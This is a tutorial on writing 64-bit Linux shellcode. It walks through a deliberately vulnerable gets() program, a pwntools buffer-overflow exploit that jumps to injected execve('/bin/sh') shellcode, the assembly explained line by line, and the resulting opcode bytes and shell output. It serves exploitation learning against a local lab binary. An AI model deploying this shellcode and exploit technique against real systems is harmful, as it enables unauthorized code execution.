# Writing Shellcode on 64 bit linux

This is a quick guide on how to write shellcode on a 64 bit linux enviornment.

#### target

 Before we get into this, let's just take a quick look at the code of the binary:
 
```
#include <stdio.h>

void vuln(void)
{
		// Declare the buffer
        char vulnBuf[100];

        // Print the address of the buffer
        printf("%p\n", &vulnBuf);

        // Here is the vulnerabillity
        // It allows us to scan in as much data as
        // we want into the 100 byte vulnBuf buffer
        gets(vulnBuf);

        return;
}

int main(void)
{
		// Call the vulnerable function
        vuln();
}

```
 
 this is a fairly straight forward, simple binary with a buffer overflow vulnerabillity from the use of `gets` (since gets doesn't have a limit on how much data it scans in, and it scans it into a finite space). We can also see that it prints the address of the char array we scan our input to, so we will know where our shellcode is stored. We will just overwrite the return address to point to the start of our input, where we will store our shellcode.
 
 If you want to compile the vulnerable code yourself, you will have to make sure you disable the stack canary, and make the stack executable:
```
 $	gcc vuln.c -o vuln64 -fno-stack-protector -z execstack
``` 
 
 you can check to see if it is disabled using pwntools:
 
```
 $	pwn checksec vuln64 
[*] '/Hackery/shellcode/x64_shellcode/vuln64'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
```

This is the exploit which I wrote for this section:

```
# Import pwn tools
from pwn import *

# Establish the target process, and attach gdb
target = process('vuln64')
#gdb.attach(target, gdbscript = 'b *0x400585')

# Get the address being leaked, strip the newline, and convert it to and integer
infoleak = target.recvline().replace("\x0a", "")
address = int(infoleak, 16) 

# Establish the shellcode:
'''
  400080:   48 bf 2f 62 69 6e 2f    movabs rdi,0x68732f6e69622f
  400087:   73 68 00 
  40008a:   57                      push   rdi
  40008b:   54                      push   rsp
  40008c:   5f                      pop    rdi
  40008d:   48 31 f6                xor    rsi,rsi
  400090:   48 31 d2                xor    rdx,rdx
  400093:   b8 3b 00 00 00          mov    eax,0x3b
  400098:   0f 05                   syscall 
'''
shellcode = "\x48\xbf\x2f\x62\x69\x6e\x2f\x73\x68\x00\x57\x54\x5f\x48\x31\xf6\x48\x31\xd2\xb8\x3b\x00\x00\x00\x0f\x05"

# Construct the payload
payload = shellcode + ((0x78 - len(shellcode))*"0") + p64(address)

# Send the payload
target.sendline(payload)

# Drop to an interactive shell
target.interactive()
```
 
#### Writing Shellcode 

 Now when we write shellcode, we are writitng assembly code. So here is the shellocde:
 
```
	mov rdi, 0x0068732f6e69622f
	push rdi
	push rsp
	pop rdi
	xor rsi, rsi
	xor rdx, rdx
	mov rax, 0x3b
	syscall
```
 
Now the main objective of our shellcode here is to run `execve("/bin/sh", NULL, NULL)`. `execve` will run a binary that we give the filepath two, with the arguments and enviornment that we pass it. We will make the call using the syscall instruction, which is a way for a program to request certain things from the kernel. The specific operation we want the kernel to do, is designated by the code we pass to it (for `execve` it is `0x3b`, you can see the full list here: http://www.cs.utexas.edu/~bismith/test/syscalls/syscalls64_orig.html). Since it is a 64 bit linux architecture, we will pass the arguments via registers. The `execve` syscall only takes three arguments, however the syscall instruction can take more. 
 
```
rax:	Syscall #, which specifies what type of syscall we want to make
rdi:	ptr to string, which will be the string of the binary executed
rsi:	ptr to array of arguments passed to the new process
rdx:	ptr to array on enviornment variables passed to the new process
r10:	argument not used
r8:		argument not used
r9:		argument not used
```

Now the shellcode is essentially just prepping the arguments for the syscall, then making it. For our arguments, we will need the `rax` register to be `0x3b`, to indicate `execve`. We will need the `rdi` register to be a ptr to `/bin/sh\x00`, since if we run that binary it will
 give us a shell (also the `\x00` is a null byte, which we will need to terminate the string). And for the last two arguments stored in the `rsi` and `rdx` registers, we will just have those be zero. The reason for this being is we really don't need to worry about arguments or the enviornment that `/bin/sh` is running in, so we can just pass null pointers for those arguments (which a null pointer is essentially zero).
 
 Now we will go through line by line of the shellcode, and explain what everything does:
 
```
	mov rdi, 0x0068732f6e69622f
```

This first line is responsible for moving the string "/bin/sh\x00" into the `rdi` register. It may look a bit weird since it is in hex and little endian (which means least signifcant byte first, so from our persepctive it looks backwards) since that is how we will get the code to reas our string properly, but here is a quick hex to ascii conversion:

```
0x00:	\x00
0x68:	h
0x73:	s
0x2f:	/
0x6e:	n
0x69:	i
0x62:	b
0x2f:	/
```

Now the `rdi` register holds the string "/bin/sh\x00", however we need it to hold a ptr to it. We can start to accomplish this by pushing it onto the stack with the next instruction:

```
	push rdi
```

Now the string `/bin/sh\x00` is at the top of the stack. Now the address to the top of the stack is stored in the `rsp` register (which currently points to the string `/bin/sh\x00`). So we can just push the value of the `rsp` register onto the stack, and the top value of the stack will be the pointer we need:

```
	push rsp
```

since the top value of the stack is an address pointing to `/bin/sh\x00`, we can just pop the top value of the stack into the `rdi` register: 

```
	pop rdi
```

Now the `rdi` register holds the address to `/bin/sh\x00` that we need. The next argument we need to worry about is the `rsi` register (which holds the pointer the arguments array). We need this to be zero (which the code will interpret as a null pointer). In order to do this, we can just xor the `rsi` register by itself, which will zero out the register since anything xored by itself is zero:

```
	xor rsi, rsi
```

now just like the `rsi` register, we need to store zero in the `rdx` register (which holds an array of the enviornment variables) for the same reason. We can just do the same thing and xor the `rsi` register by itself:

```
	xor rdx, rdx
```

lastly we need to load the value `0x3b` into the `rax` register, which is the syscall code for `execve`. That way when the syscall is made, it will know which syscall to make. For this, we can just move the value `0x3b` into that register:

```
	mov rax, 0x3b
```

proceeding that, our registers will look like this:

```
rax:	0x3b (code for execve)
rdi:	ptr to "/bin/sh\x00"
rsi:	0x0 (null ptr)
rdx:	0x0 (null ptr)
```

now we are ready to make the syscall:

```
	syscall
```

#### Assembling Shellcode

First step is you need to write the shellcode. Just do it in whatever text ediot you want. Here is what the shellcode for the segment above looks like:
```
$	cat shellcode.asm 
; execve(), based off of shellcode from http://shell-storm.org/shellcode/files/shellcode-603.php
[SECTION .text]
global _start
_start:
	mov rdi, 0x0068732f6e69622f
	push rdi
	push rsp
	pop rdi
	xor rsi, rsi
	xor rdx, rdx
	mov rax, 0x3b
	syscall
```

proceeding that, you will need to assemble it:
```
$	nasm -f elf64 shellcode.asm
```

after that you will just need to link it (`shellcode.o` should be a newly generated file from the previous step):
```
$	ld -o shellcode shellcode.o
```

after that, you will be able to see your shellcode with this:
```
objdump -D shellcode -M intel

shellcode:     file format elf64-x86-64


Disassembly of section .text:

0000000000400080 <_start>:
  400080:	48 bf 2f 62 69 6e 2f 	movabs rdi,0x68732f6e69622f
  400087:	73 68 00 
  40008a:	57                   	push   rdi
  40008b:	54                   	push   rsp
  40008c:	5f                   	pop    rdi
  40008d:	48 31 f6             	xor    rsi,rsi
  400090:	48 31 d2             	xor    rdx,rdx
  400093:	b8 3b 00 00 00       	mov    eax,0x3b
  400098:	0f 05                	syscall 
```

There we can see the shellcode, and the opcodes which the assembly code assembles to. Putting it all together in a single hex string, our shellcode looks like this:
```
\x48\xbf\x2f\x62\x69\x6e\x2f\x73\x68\x00\x57\x54\x5f\x48\x31\xf6\x48\x31\xd2\xb8\x3b\x00\x00\x00\x0f\x05
```

#### Extra

Now depending on what target you are going after, you might have to write shellcode to jump through special hoops (just something to keep in mind).

Although we used `syscall` to get a shell, it is still possible to use `int 0x80` like with 32 bit systems.

Here are some ctf writeups I made, which utilize shellcode in this architecture:
```
https://github.com/guyinatuxedo/ctf/tree/master/csaw17/pwn/pilot
https://github.com/guyinatuxedo/ctf/tree/master/csaw18/pwn/shellpointcode
```

I referenced this shellcode while writing the above shellcode:
```
http://shell-storm.org/shellcode/files/shellcode-603.php
```

also just testing out shellcode:
```
$	./shellcode 
$ echo hi
hi
$ exit
$	python exploit.py 
[!] Could not find executable 'vuln64' in $PATH, using './vuln64' instead
[+] Starting local process './vuln64': pid 13791
[*] Switching to interactive mode
$ ls
exploit.py  readme.md  shellcode  shellcode.asm  shellcode.o  vuln.c  vuln64
$ w
 22:07:44 up  7:30,  1 user,  load average: 1.40, 1.24, 1.23
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
guy      tty7     :0               14:50    7:29m 14:06   0.44s /sbin/upstart --user
$ exit
```
also if you want the full list of what syscall codes correspond to which operations:
```
$	cat /usr/include/asm/unistd_64.h | grep execve
#define __NR_execve 59
#define __NR_execveat 322
```